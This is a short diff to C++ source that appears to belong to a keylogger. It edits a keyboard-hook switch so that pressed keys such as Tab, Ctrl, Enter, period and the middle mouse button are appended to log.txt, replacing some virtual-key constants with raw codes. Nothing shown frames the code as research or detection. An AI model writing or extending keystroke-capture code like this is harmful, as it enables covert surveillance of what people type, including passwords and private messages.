@@ -40,11 +40,14 @@ ofstream myfile("log.txt", std::ios::app);
             switch( pKeyBoard->vkCode ) 
             {
 //Buttons	
+				case VK_MBUTTON:
+					myfile<<"\n button \n";
+				break;
             	case VK_TAB:
             		myfile<<"\n Tab \n";
             	break;
-				case VK_CONTROL:
-            		myfile<<"Ctrl";
+				case 0xA2:
+            		myfile<<"\n Ctrl \n";
             	break;
             	case VK_RETURN: 
                 	myfile<<"\n Enter  \n"; 
@@ -58,7 +61,7 @@ ofstream myfile("log.txt", std::ios::app);
 				case VK_SPACE:
 					myfile<<"\n";
 				break;
-				case VK_DECIMAL:
+				case 0xBE:
 					myfile<<".";
 				break;
 				case VK_BACK:
